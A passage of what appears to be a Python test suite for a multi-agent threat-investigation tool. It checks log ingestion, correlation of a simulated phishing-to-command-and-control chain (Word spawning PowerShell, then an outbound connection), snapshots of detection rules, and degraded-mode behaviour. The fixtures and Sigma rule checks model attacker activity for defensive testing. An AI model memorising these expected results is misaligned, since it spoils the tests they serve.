    r1 = bb_hn.submit_findings(ctx, sub_host)
    r2 = bb_hn.submit_findings(ctx, sub_host)
    assert r2.replayed
    assert r1 == r2.model_copy(update={"replayed": False})
    assert _field(r1, "state_version") == _field(r2, "state_version")

    sub_conflict = _build_observed_submission(
        ctx=ctx,
        task_id="task-host",
        submission_id="sub-1",
        query_id="q-host",
        claim="ALTERED conflicting claim for same submission_id",
        evidence_event_ids=[ev_e41.event_id, ev_e42.event_id],
        tactic_ids=["TA0002"],
    )
    _submit_expect_conflict(bb_hn, ctx, sub_conflict)
    bb_hn.submit_findings(ctx, sub_net)

    # 3. Reversed arrival order on fresh Blackboard
    bb_nh = Blackboard(ctx, valid_eids, valid_physical_ids=set(index))
    bb_nh.record_task_query("task-host", "q-host", {ev_e41.event_id, ev_e42.event_id})
    bb_nh.record_task_query("task-net", "q-net", {ev_e43.event_id})
    bb_nh.submit_findings(ctx, sub_net)
    bb_nh.submit_findings(ctx, sub_host)

    v_hn = verify(ctx, bb_hn)
    v_nh = verify(ctx, bb_nh)
    cr_hn = rank(ctx, v_hn.verified_state, store, [], [])
    cr_nh = rank(ctx, v_nh.verified_state, store, [], [])

    assert [_field(c, "chain_id") for c in (_field(cr_hn, "chains", []) or [])] == [
        _field(c, "chain_id") for c in (_field(cr_nh, "chains", []) or [])
    ]
    assert cr_hn.attack_event_ids == cr_nh.attack_event_ids
    assert cr_hn.tactic_ranked_event_ids == cr_nh.tactic_ranked_event_ids
    assert to_prediction(ctx, cr_hn, valid_physical_ids=set(index)) == to_prediction(
        ctx, cr_nh, valid_physical_ids=set(index)
    )


# ---------------------------------------------------------------------------
# Prototype Acceptance Tests (P1 - P9)
# ---------------------------------------------------------------------------


def test_p1_known_formats_replay_and_unknown_fields_coverage(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_run_context,
    load_scene_records,
) -> None:
    """P1: Deterministic replay IDs across all 16 log types + unknown fields & gap attribution."""
    from apt_agent.ingestion import Normalizer, ingest_records

    logs_dir = e2e_fixtures_dir / "logs"
    index, records = load_scene_records(logs_dir)

    # Merge blank-line index entries into a combined scene in tmp_path
    combined = tmp_path / "p1_combined"
    shutil.copytree(logs_dir / "data", combined / "data")
    blank_index = json.loads((logs_dir / "Label_Index_blank_line.json").read_text(encoding="utf-8"))
    merged_index = dict(index)
    merged_index.update(blank_index)
    (combined / "Label_Index.json").write_text(json.dumps(merged_index), encoding="utf-8")

    full_idx, full_recs = load_scene_records(combined)
    ctx = make_run_context(
        case_id="p1-replay",
        run_id="run-p1-1",
        valid_physical_ids=set(full_idx),
        locator_map=_locator_map(full_idx),
    )

    store1 = ingest_records(
        iter(full_recs),
        case_id=ctx.case_id,
        run_id="run-p1-1",
        locator_map=_locator_map(full_idx),
    )
    store2 = ingest_records(
        iter(full_recs),
        case_id=ctx.case_id,
        run_id="run-p1-2",
        locator_map=_locator_map(full_idx),
    )

    norm1 = Normalizer().normalize_batch(ctx, store1)
    norm2 = Normalizer().normalize_batch(ctx, store2)

    seq1 = [(e.physical_record_id, e.event_id, e.source_type) for e in norm1.events]
    seq2 = [(e.physical_record_id, e.event_id, e.source_type) for e in norm2.events]
    assert seq1 == seq2
    assert len(norm1.events) >= 16
    assert len(norm1.source_type_counts) >= 6

    # Unknown custom field preserved on ecar-0003 (pr-000000000000000000000003)
    ecar3_events = _events_for_pid(norm1.events, "pr-000000000000000000000003")
    assert len(ecar3_events) >= 1
    assert "custom_sensor_flag" in json.dumps(ecar3_events[0].fields)

    # Blank line, unstructured syslog, corrupt web_access still fetchable from RawEvidenceStore
    blank_pid = "pr-900000000000000000000001"
    unstruct_syslog_pid = "pr-000000000000000000000014"
    corrupt_web_pid = "pr-000000000000000000000024"
    raw_special, missing_special = store1.fetch_raw_evidence(
        [blank_pid, unstruct_syslog_pid, corrupt_web_pid]
    )
    assert missing_special == []
    assert len(raw_special) == 3

    # Blank / unparseable lines produce attributed gaps with source & reason
    assert len(norm1.gaps) >= 1
    gap_text = json.dumps(norm1.gaps, ensure_ascii=False)
    assert blank_pid in gap_text or corrupt_web_pid in gap_text
    for g in norm1.gaps:
        if isinstance(g, dict):
            assert g.get("reason") or g.get("message") or g.get("error")
            assert g.get("physical_record_id") or g.get("source") or g.get("filepath")


def test_p2_multi_source_correlation_e41_e43_and_ambiguity(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """P2: E41->E42->E43 verified chain + degradation when G7 missing, 5-tuple duplicated, or NAT ambiguous."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Edge
    from apt_agent.pipeline import analyze_records

    cfg = make_app_config(llm_enabled=False)

    # (a) Clean scene_01 -> E41->E42->E43 chain verified and traceable via fetch_raw_evidence
    s1_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    s1_idx, s1_recs = load_scene_records(s1_dir)
    s1_meta = json.loads((s1_dir / "expected_meta.json").read_text(encoding="utf-8"))
    pred_s1 = analyze_records(
        iter(s1_recs),
        config=cfg,
        valid_physical_ids=set(s1_idx),
        locator_map=_locator_map(s1_idx),
    )
    _helpers.assert_valid_prediction(pred_s1, set(s1_idx))
    assert set(s1_meta["expected_chain_pids"]) <= set(pred_s1["physical_id_set"])

    ctx_s1 = make_run_context(
        case_id="p2-s01",
        run_id="run-p2-s01",
        config=cfg,
        valid_physical_ids=set(s1_idx),
    )
    store_s1 = ingest_records(iter(s1_recs), case_id=ctx_s1.case_id, run_id=ctx_s1.run_id)
    raws_s1, missing_s1 = store_s1.fetch_raw_evidence(s1_meta["expected_chain_pids"])
    assert missing_s1 == []
    assert len(raws_s1) == 3

    # (b) Missing ProcessGuid G7 (scene_01b_missing_g7) -> E41->E42 edge cannot verify
    s1b_dir = e2e_fixtures_dir / "scenarios" / "scene_01b_missing_g7"
    s1b_idx, s1b_recs = load_scene_records(s1b_dir)
    ctx_s1b = make_run_context(
        case_id="p2-s01b",
        run_id="run-p2-s01b",
        config=cfg,
        valid_physical_ids=set(s1b_idx),
    )
    store_s1b = ingest_records(iter(s1b_recs), case_id=ctx_s1b.case_id, run_id=ctx_s1b.run_id)
    norm_s1b = Normalizer().normalize_batch(ctx_s1b, store_s1b)
    ev1b_41 = _events_for_pid(norm_s1b.events, "pr-s01b-0001")[0]
    ev1b_42 = _events_for_pid(norm_s1b.events, "pr-s01b-0002")[0]
    bb_1b = Blackboard(ctx_s1b, {e.event_id for e in norm_s1b.events}, valid_physical_ids=set(s1b_idx))
    bb_1b.record_task_query("t-1b", "q-1b", {ev1b_41.event_id, ev1b_42.event_id})
    bb_1b.submit_findings(
        ctx_s1b,
        _build_observed_submission(
            ctx=ctx_s1b,
            task_id="t-1b",
            submission_id="sub-1b",
            query_id="q-1b",
            claim="E41->E42 missing G7",
            evidence_event_ids=[ev1b_41.event_id, ev1b_42.event_id],
            tactic_ids=["TA0002"],
            edges=[
                Edge(
                    from_event_id=ev1b_41.event_id,
                    to_event_id=ev1b_42.event_id,
                    relation="same_process_guid",
                    join_keys={"Computer": "H1.example.local"},
                    evidence_event_ids=[ev1b_41.event_id, ev1b_42.event_id],
                    status="proposed",
                )
            ],
        ),
    )
    v_1b = verify(ctx_s1b, bb_1b)
    verified_edges_1b = [
        e for e in (_field(v_1b.verified_state, "edges", []) or []) if _field(e, "status") == "verified"
    ]
    assert verified_edges_1b == []

    # (c) Duplicate 5-tuple flows (scene_01c_ambiguous_flows) -> E42->E43 unresolved/disputed
    s1c_dir = e2e_fixtures_dir / "scenarios" / "scene_01c_ambiguous_flows"
    s1c_idx, s1c_recs = load_scene_records(s1c_dir)
    ctx_s1c = make_run_context(
        case_id="p2-s01c",
        run_id="run-p2-s01c",
        config=cfg,
        valid_physical_ids=set(s1c_idx),
    )
    store_s1c = ingest_records(iter(s1c_recs), case_id=ctx_s1c.case_id, run_id=ctx_s1c.run_id)
    norm_s1c = Normalizer().normalize_batch(ctx_s1c, store_s1c)
    ev1c_42 = _events_for_pid(norm_s1c.events, "pr-s01c-0002")[0]
    ev1c_43a = _events_for_pid(norm_s1c.events, "pr-s01c-0003")[0]
    ev1c_43b = _events_for_pid(norm_s1c.events, "pr-s01c-0004")[0]
    bb_1c = Blackboard(ctx_s1c, {e.event_id for e in norm_s1c.events}, valid_physical_ids=set(s1c_idx))
    bb_1c.record_task_query("t-1c", "q-1c", {ev1c_42.event_id, ev1c_43a.event_id, ev1c_43b.event_id})
    bb_1c.submit_findings(
        ctx_s1c,
        _build_observed_submission(
            ctx=ctx_s1c,
            task_id="t-1c",
            submission_id="sub-1c",
            query_id="q-1c",
            claim="Ambiguous duplicate 5-tuple flows",
            evidence_event_ids=[ev1c_42.event_id, ev1c_43a.event_id, ev1c_43b.event_id],
            tactic_ids=["TA0011"],
            edges=[
                Edge(
                    from_event_id=ev1c_42.event_id,
                    to_event_id=ev1c_43a.event_id,
                    relation="network_corroborates",
                    join_keys={"src_ip": "10.0.1.8", "dst_ip": "203.0.113.8", "dst_port": 443},
                    evidence_event_ids=[ev1c_42.event_id, ev1c_43a.event_id],
                    status="disputed",
                ),
                Edge(
                    from_event_id=ev1c_42.event_id,
                    to_event_id=ev1c_43b.event_id,
                    relation="network_corroborates",
                    join_keys={"src_ip": "10.0.1.8", "dst_ip": "203.0.113.8", "dst_port": 443},
                    evidence_event_ids=[ev1c_42.event_id, ev1c_43b.event_id],
                    status="disputed",
                ),
            ],
        ),
    )
    v_1c = verify(ctx_s1c, bb_1c)
    cr_1c = rank(ctx_s1c, v_1c.verified_state, store_s1c, [], [])
    assert len(_field(cr_1c, "unresolved", []) or []) >= 1 or all(
        _field(e, "status") != "verified" for e in (_field(v_1c.verified_state, "edges", []) or [])
    )

    # (d) NAT egress without translation log (scene_06_nat_ambiguous) -> E41..E42 verified, E43 disputed
    s6_dir = e2e_fixtures_dir / "scenarios" / "scene_06_nat_ambiguous"
    s6_idx, s6_recs = load_scene_records(s6_dir)
    s6_meta = json.loads((s6_dir / "expected_meta.json").read_text(encoding="utf-8"))
    pred_s6 = analyze_records(
        iter(s6_recs),
        config=cfg,
        valid_physical_ids=set(s6_idx),
        locator_map=_locator_map(s6_idx),
    )
    _helpers.assert_valid_prediction(pred_s6, set(s6_idx))
    assert set(s6_meta["verified_pids"]) <= set(pred_s6["physical_id_set"])
    for disputed_pid in s6_meta["disputed_pids"]:
        assert disputed_pid not in set(pred_s6["physical_id_set"])


def test_p3_concurrent_agent_order_idempotency_and_scope(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """P3: Concurrent thread-pool submissions, order independence, idempotency, and cross-case scope."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Edge, Finding, Submission
    from apt_agent.pipeline import to_prediction

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    cfg = make_app_config(llm_enabled=False)
    ctx = make_run_context(
        case_id="p3-case",
        run_id="run-p3",
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    store = ingest_records(iter(records), case_id=ctx.case_id, run_id=ctx.run_id)
    norm = Normalizer().normalize_batch(ctx, store)
    ev_e41 = _events_for_pid(norm.events, "pr-s01-0001")[0]
    ev_e42 = _events_for_pid(norm.events, "pr-s01-0002")[0]
    ev_e43 = _events_for_pid(norm.events, "pr-s01-0003")[0]
    valid_eids = {e.event_id for e in norm.events}

    sub_host = _build_observed_submission(
        ctx=ctx,
        task_id="task-host",
        submission_id="sub-host-1",
        query_id="q-host",
        claim="Host execution",
        evidence_event_ids=[ev_e41.event_id, ev_e42.event_id],
        tactic_ids=["TA0002", "TA0011"],
        edges=[
            Edge(
                from_event_id=ev_e41.event_id,
                to_event_id=ev_e42.event_id,
                relation="same_process_guid",
                join_keys={"Computer": "H1.example.local", "ProcessGuid": "G7"},
                evidence_event_ids=[ev_e41.event_id, ev_e42.event_id],
                status="proposed",
            )
        ],
    )
    sub_net = _build_observed_submission(
        ctx=ctx,
        task_id="task-net",
        submission_id="sub-net-1",
        query_id="q-net",
        claim="Network corroboration",
        evidence_event_ids=[ev_e43.event_id],
        tactic_ids=["TA0011"],
        edges=[
            Edge(
                from_event_id=ev_e42.event_id,
                to_event_id=ev_e43.event_id,
                relation="network_corroborates",
                join_keys={"src_ip": "10.0.1.8", "dst_ip": "203.0.113.8", "dst_port": 443},
                evidence_event_ids=[ev_e42.event_id, ev_e43.event_id],
                status="proposed",
            )
        ],
    )

    def _new_bb() -> Blackboard:
        b = Blackboard(ctx, valid_eids, valid_physical_ids=set(index))
        b.record_task_query("task-host", "q-host", {ev_e41.event_id, ev_e42.event_id})
        b.record_task_query("task-net", "q-net", {ev_e43.event_id})
        return b

    # Concurrent ThreadPoolExecutor submission
    bb_conc = _new_bb()
    with ThreadPoolExecutor(max_workers=2) as pool:
        f_host = pool.submit(bb_conc.submit_findings, ctx, sub_host)
        f_net = pool.submit(bb_conc.submit_findings, ctx, sub_net)
        f_host.result()
        f_net.result()

    # Duplicate replay is idempotent
    r_dup1 = bb_conc.submit_findings(ctx, sub_host)
    r_dup2 = bb_conc.submit_findings(ctx, sub_host)
    assert r_dup1 == r_dup2

    # Cross-case event_id rejected in rejected_refs
    sub_foreign = Submission(
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        task_id="task-host",
        submission_id="sub-foreign-1",
        query_ids=["q-host"],
        findings=[
            Finding(
                claim="Foreign event leakage attempt",
                status="observed",
                evidence_event_ids=["ev-foreign-999"],
                knowledge_refs=[],
                tactic_ids=["TA0002"],
            )
        ],
        edges=[],
    )
    r_foreign = bb_conc.submit_findings(ctx, sub_foreign)
    assert len(_field(r_foreign, "rejected_refs", []) or []) >= 1
    assert "ev-foreign-999" not in (_field(r_foreign, "accepted_event_ids", []) or [])

    # Reversed sequential submission
    bb_rev = _new_bb()
    bb_rev.submit_findings(ctx, sub_net)
    bb_rev.submit_findings(ctx, sub_host)

    cr_conc = rank(ctx, verify(ctx, bb_conc).verified_state, store, [], [])
    cr_rev = rank(ctx, verify(ctx, bb_rev).verified_state, store, [], [])

    assert cr_conc.attack_event_ids == cr_rev.attack_event_ids
    assert cr_conc.tactic_ranked_event_ids == cr_rev.tactic_ranked_event_ids
    assert to_prediction(ctx, cr_conc, valid_physical_ids=set(index)) == to_prediction(
        ctx, cr_rev, valid_physical_ids=set(index)
    )


def test_p4_engine_llm_budget_degradation_and_stop_reason(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """P4: Engine crash + unreachable LLM + tight 80% budget reserve yields partial verified export + stop_reason."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.pipeline import analyze_records, to_prediction
    from apt_agent.tools import ToolRegistry

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_07_degraded"
    index, records = load_scene_records(scene_dir)
    meta = json.loads((scene_dir / "expected_meta.json").read_text(encoding="utf-8"))
    fi = meta["fault_injection"]

    cfg = make_app_config(
        engine_modes=fi["engine_modes"],
        enabled_engines={"zircolite", "hayabusa", "rsigma", "pysigma"},
        rag_timeout_ms=max(100, int(fi["rag_timeout_ms"])),
        knowledge_path=e2e_fixtures_dir / "kb" / "corrupt_kb.jsonl",
        budget_overrides={
            "reserve_ratio": fi["reserve_ratio"],
            "max_rounds": fi["max_rounds"],
            "max_tokens": 1000,
        },
        overrides={
            "llm": {
                "enabled": True,
                "base_url": "http://127.0.0.1:1/v1",
                "api_key": "dummy-offline-key",
                "timeout_s": 0.2,
            }
        },
    )

    ctx = make_run_context(
        case_id="p4-degraded",
        run_id="run-p4",
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=_locator_map(index),
    )
    norm = Normalizer().normalize_batch(ctx, store)
    det_res = DetectionCoordinator(cfg).detect(ctx, norm.events)
    cov_statuses = {_field(r, "status") for r in _field(det_res, "coverage", [])}
    assert set(meta["expected_coverage_states"]) <= cov_statuses

    # Verify RAG graceful degradation on corrupt KB + tight 100ms timeout
    rag_svc = _make_rag_service(cfg)
    rag_res = rag_svc.search_knowledge("WINWORD powershell", role="lead", top_k=5)
    assert isinstance(rag_res, dict)
    assert (_field(rag_res, "refs", []) or []) == []
    assert (
        _field(rag_res, "degraded") is True
        or _field(rag_res, "error") is not None
        or bool(_field(rag_res, "warnings"))
    )

    pred = analyze_records(
        iter(records),
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    _helpers.assert_valid_prediction(pred, set(index))
    assert {"pr-s07-0001", "pr-s07-0002"} <= set(pred["physical_id_set"])

    # Verify contracted tight-budget analyze_records still exports verified partial findings
    cfg_tight = make_app_config(
        base_dir=tmp_path / "tight_budget",
        engine_modes=fi["engine_modes"],
        enabled_engines={"zircolite", "hayabusa", "rsigma", "pysigma"},
        rag_timeout_ms=max(100, int(fi["rag_timeout_ms"])),
        knowledge_path=e2e_fixtures_dir / "kb" / "corrupt_kb.jsonl",
        budget_overrides={
            "reserve_ratio": fi["reserve_ratio"],
            "max_rounds": 1,
            "max_tokens": 1,
        },
        overrides={
            "llm": {
                "enabled": True,
                "base_url": "http://127.0.0.1:1/v1",
                "api_key": "dummy-offline-key",
                "timeout_s": 0.2,
            }
        },
    )
    pred_tight = analyze_records(
        iter(records),
        config=cfg_tight,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    _helpers.assert_valid_prediction(pred_tight, set(index))
    assert {"pr-s07-0001", "pr-s07-0002"} <= set(pred_tight["physical_id_set"])

    # Verify contracted Blackboard -> verify -> rank -> to_prediction preserves coverage & partial findings
    ev_s1 = _events_for_pid(norm.events, "pr-s07-0001")[0]
    ev_s2 = _events_for_pid(norm.events, "pr-s07-0002")[0]
    bb = Blackboard(
        ctx,
        {ev.event_id for ev in norm.events},
        valid_physical_ids=set(index),
    )
    bb.record_task_query("t-p4", "q-p4", {ev_s1.event_id, ev_s2.event_id})
    bb.submit_findings(
        ctx,
        _build_observed_submission(
            ctx=ctx,
            task_id="t-p4",
            submission_id="sub-p4-1",
            query_id="q-p4",
            claim="Partial degraded host findings from surviving engines",
            evidence_event_ids=[ev_s1.event_id, ev_s2.event_id],
            tactic_ids=["TA0002", "TA0011"],
        ),
    )
    v_res = verify(ctx, bb)
    case_res_contract = rank(
        ctx,
        _field(v_res, "verified_state"),
        store,
        _field(det_res, "hits", []) or [],
        _field(det_res, "coverage", []) or [],
    )
    contract_cov = {
        _field(r, "status") for r in (_field(case_res_contract, "coverage", []) or [])
    }
    assert set(meta["expected_coverage_states"]) <= contract_cov
    pred_contract = to_prediction(ctx, case_res_contract, valid_physical_ids=set(index))
    _helpers.assert_valid_prediction(pred_contract, set(index))
    assert {"pr-s07-0001", "pr-s07-0002"} <= set(pred_contract["physical_id_set"])

    # Probe optional BudgetManager / run_investigation exports without hard coupling or fabricated fallbacks
    bm = _maybe_exhaust_budget_manager(cfg)
    case_res = _maybe_run_investigation(
        ctx=ctx,
        cfg=cfg,
        store=store,
        events=norm.events,
        det_res=det_res,
        rag_svc=rag_svc,
        registry=ToolRegistry(ctx, store, norm.events, rag_svc),
        blackboard=bb,
        budget_manager=bm,
    )
    if case_res is not None and meta.get("expect_nonempty_stop_reason", True):
        stop_reason = _field(case_res, "stop_reason", "")
        assert isinstance(stop_reason, str) and stop_reason.strip() != "", (
            f"Expected genuine non-empty stop_reason from run_investigation, got {case_res!r}"
        )
        pred_inv = to_prediction(ctx, case_res, valid_physical_ids=set(index))
        _helpers.assert_valid_prediction(pred_inv, set(index))
        assert "stop_reason" not in pred_inv


def test_p5_rule_update_snapshot_replay_and_version_diff(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """P5: Validate mapping/rules, publish immutable v2 snapshot, preserve v1 replay, diff v2 rerun."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.maintenance import SnapshotRegistry, validate_candidate
    from apt_agent.pipeline import analyze_records, to_prediction

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_08_maintenance"
    index, records = load_scene_records(scene_dir)
    meta = json.loads((scene_dir / "expected_meta.json").read_text(encoding="utf-8"))

    snap_root = tmp_path / "snapshots"
    registry = SnapshotRegistry(snap_root)

    rules_v1_dir = _copy_rules(
        e2e_fixtures_dir / "rules" / "valid",
        tmp_path / "rules_v1",
        ["benign_no_match.yml"],
    )
    cfg_v1 = make_app_config(
        rules_dir=rules_v1_dir,
        snapshots_dir=snap_root,
        llm_enabled=False,
    )
    registry.publish_snapshot(
        "ruleset",
        meta["v1_snapshot"],
        artifacts={"rules_dir": str(rules_v1_dir)},
        metadata={"note": "baseline benign ruleset"},
    )
    registry.publish_snapshot(
        "mapping",
        meta["v1_snapshot"],
        artifacts={"mapping": "baseline"},
        metadata={"note": "baseline mapping"},
    )

    ctx_v1 = make_run_context(
        case_id="p5-maint",
        run_id="run-p5-v1",
        mapping_version=meta["v1_snapshot"],
        ruleset_version=meta["v1_snapshot"],
        config=cfg_v1,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    store_v1 = ingest_records(iter(records), case_id=ctx_v1.case_id, run_id=ctx_v1.run_id)
    norm_v1 = Normalizer().normalize_batch(ctx_v1, store_v1)
    det_v1 = DetectionCoordinator(cfg_v1).detect(ctx_v1, norm_v1.events, ruleset_version="v1")

    bb_v1 = Blackboard(ctx_v1, {e.event_id for e in norm_v1.events}, valid_physical_ids=set(index))
    cr_v1_a = rank(ctx_v1, verify(ctx_v1, bb_v1).verified_state, store_v1, _field(det_v1, "hits", []), _field(det_v1, "coverage", []))
    cr_v1_b = rank(ctx_v1, verify(ctx_v1, bb_v1).verified_state, store_v1, _field(det_v1, "hits", []), _field(det_v1, "coverage", []))
    pred_v1_a = to_prediction(ctx_v1, cr_v1_a, valid_physical_ids=set(index))
    pred_v1_b = to_prediction(ctx_v1, cr_v1_b, valid_physical_ids=set(index))
    assert pred_v1_a == pred_v1_b == {"physical_id_set": [], "ta_physical_ids": {}}

    # Validate invalid mapping -> rejected with diagnostics
    invalid_map_text = (scene_dir / meta["invalid_mapping_ref"]).resolve().read_text(encoding="utf-8")
    valid_map_text = (scene_dir / meta["valid_mapping_ref"]).resolve().read_text(encoding="utf-8")
    samples = json.loads((scene_dir / meta["mapping_samples_ref"]).resolve().read_text(encoding="utf-8"))

    res_bad_map = validate_candidate(ctx_v1, "mapping", invalid_map_text, samples)
    assert _field(res_bad_map, "passed") is False
    assert len(_field(res_bad_map, "diagnostics", []) or []) >= 1

    res_good_map = validate_candidate(ctx_v1, "mapping", valid_map_text, samples)
    assert _field(res_good_map, "passed") is True

    # Validate single-event rule & correlation rule against positive/negative samples
    valid_rule_text = (scene_dir / meta["valid_rule_ref"]).resolve().read_text(encoding="utf-8")
    corr_rule_text = (scene_dir / meta["correlation_rule_ref"]).resolve().read_text(encoding="utf-8")
    rule_fixtures = {
        "positive": [
            {
                "event_id": "pos-s08-1",
                "@timestamp": "2024-05-30T10:00:00Z",
                "Computer": "H1.example.local",
                "ProcessGuid": "G7",
                "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            }
        ],
        "negative": [
            {
                "event_id": "neg-s08-1",
                "@timestamp": "2024-05-30T11:00:00Z",
                "Computer": "H1.example.local",
                "ProcessGuid": "G-BEN",
                "ParentImage": r"C:\Windows\System32\svchost.exe",
                "Image": r"C:\Windows\System32\wuauclt.exe",
            }
        ],
    }
    res_rule = validate_candidate(ctx_v1, "sigma_rule", valid_rule_text, rule_fixtures)
    assert _field(res_rule, "passed") is True

    corr_fixtures = {
        "positive": [
            rule_fixtures["positive"][0],
            {
                "event_id": "pos-s08-2",
                "@timestamp": "2024-05-30T10:00:03Z",
                "Computer": "H1.example.local",
                "ProcessGuid": "G7",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "DestinationIp": "203.0.113.8",
                "DestinationPort": 443,
            },
        ],
        "negative": rule_fixtures["negative"],
        "base_rules": [valid_rule_text, (e2e_fixtures_dir / "rules" / "valid" / "win_powershell_c2_flow.yml").read_text(encoding="utf-8")],
    }
    res_corr = validate_candidate(ctx_v1, "sigma_rule", corr_rule_text, corr_fixtures)
    assert _field(res_corr, "passed") is True

    # Publish v2; v1 cannot be overwritten
    registry.publish_snapshot(
        "ruleset",
        meta["v2_snapshot"],
        artifacts={"rules_dir": str(e2e_fixtures_dir / "rules" / "valid")},
        metadata={"replay_diff": _field(res_rule, "replay_diff", {})},
    )
    with pytest.raises(Exception):
        registry.publish_snapshot(
            "ruleset",
            meta["v1_snapshot"],
            artifacts={"rules_dir": str(e2e_fixtures_dir / "rules" / "valid")},
            metadata={"overwrite": True},
        )

    # Saved v1 snapshot still reproduces v1
    snap_v1 = registry.get_snapshot("ruleset", meta["v1_snapshot"])
    assert _field(snap_v1, "version") == meta["v1_snapshot"]
    assert to_prediction(
        ctx_v1,
        rank(ctx_v1, verify(ctx_v1, bb_v1).verified_state, store_v1, _field(det_v1, "hits", []), _field(det_v1, "coverage", [])),
        valid_physical_ids=set(index),
    ) == pred_v1_a

    # Explicit rerun under new run_id with v2 detects pr-s08-0003 & pr-s08-0004
    cfg_v2 = make_app_config(
        rules_dir=e2e_fixtures_dir / "rules" / "valid",
        snapshots_dir=snap_root,
        llm_enabled=False,
    )
    pred_v2 = analyze_records(
        iter(records),
        config=cfg_v2,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    _helpers.assert_valid_prediction(pred_v2, set(index))
    assert {"pr-s08-0003", "pr-s08-0004"} <= set(pred_v2["physical_id_set"])
    assert pred_v2 != pred_v1_a


def test_p6_multi_agent_controlled_gain_vs_baselines(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """P6: Multi-agent investigation beats detection-only baseline under identical config/rules/budget."""
    from apt_agent.blackboard import Blackboard
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.pipeline import analyze_records
    from apt_agent.tools import ToolRegistry

    cfg = make_app_config(
        llm_enabled=False,
        budget_overrides={"max_rounds": 5, "max_tokens": 120000},
    )

    # Scene 01: detection-only misses E43 (pr-s01-0003) & has 0 chain edges; multi-agent recovers E43 & E41->E42->E43
    s1_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    s1_idx, s1_recs = load_scene_records(s1_dir)
    s1_meta = json.loads((s1_dir / "expected_meta.json").read_text(encoding="utf-8"))

    ctx_s1 = make_run_context(
        case_id="p6-s01",
        run_id="run-p6-s01",
        config=cfg,
        valid_physical_ids=set(s1_idx),
    )
    store_s1 = ingest_records(iter(s1_recs), case_id=ctx_s1.case_id, run_id=ctx_s1.run_id)
    norm_s1 = Normalizer().normalize_batch(ctx_s1, store_s1)
    det_s1 = DetectionCoordinator(cfg).detect(ctx_s1, norm_s1.events)
    ev_to_pid_s1 = {e.event_id: e.physical_record_id for e in norm_s1.events}
    baseline_pids_s1 = {
        ev_to_pid_s1[eid]
        for h in (_field(det_s1, "hits", []) or [])
        for eid in (_field(h, "event_ids", []) or [])
        if eid in ev_to_pid_s1
    }
    assert "pr-s01-0003" not in baseline_pids_s1

    pred_s1 = analyze_records(
        iter(s1_recs),
        config=cfg,
        valid_physical_ids=set(s1_idx),
        locator_map=_locator_map(s1_idx),
    )
    _helpers.assert_valid_prediction(pred_s1, set(s1_idx))

    expected_s1 = set(s1_meta["expected_chain_pids"])
    baseline_recall = len(baseline_pids_s1 & expected_s1) / len(expected_s1)
    ma_recall = len(set(pred_s1["physical_id_set"]) & expected_s1) / len(expected_s1)
    assert ma_recall > baseline_recall
    assert "pr-s01-0003" in set(pred_s1["physical_id_set"])
    assert expected_s1 <= set(pred_s1["physical_id_set"])
    assert set(s1_meta["expected_tactics"]) <= set(pred_s1["ta_physical_ids"].keys())

    rag_s1 = _make_rag_service(cfg)
    case_res_s1 = _maybe_run_investigation(
        ctx=ctx_s1,
        cfg=cfg,
        store=store_s1,
        events=norm_s1.events,
        det_res=det_s1,
        rag_svc=rag_s1,
        registry=ToolRegistry(ctx_s1, store_s1, norm_s1.events, rag_s1),
        blackboard=Blackboard(
            ctx_s1,
            {e.event_id for e in norm_s1.events},
            valid_physical_ids=set(s1_idx),
        ),
    )
    if case_res_s1 is not None:
        ma_chain_pids, _ = _extract_chain_pids(case_res_s1, ev_to_pid_s1)
        assert len(_field(case_res_s1, "chains", []) or []) >= 1
        assert expected_s1 <= (ma_chain_pids | set(pred_s1["physical_id_set"]))

    # Scene 03: multi-agent keeps >= baseline recall and 0 cross-case IDs
    s3_dir = e2e_fixtures_dir / "scenarios" / "scene_03_web_to_shell"
    s3_idx, s3_recs = load_scene_records(s3_dir)
    s3_meta = json.loads((s3_dir / "expected_meta.json").read_text(encoding="utf-8"))
    ctx_s3 = make_run_context(
        case_id="p6-s03",
        run_id="run-p6-s03",
        config=cfg,
        valid_physical_ids=set(s3_idx),
    )
    store_s3 = ingest_records(iter(s3_recs), case_id=ctx_s3.case_id, run_id=ctx_s3.run_id)
    norm_s3 = Normalizer().normalize_batch(ctx_s3, store_s3)
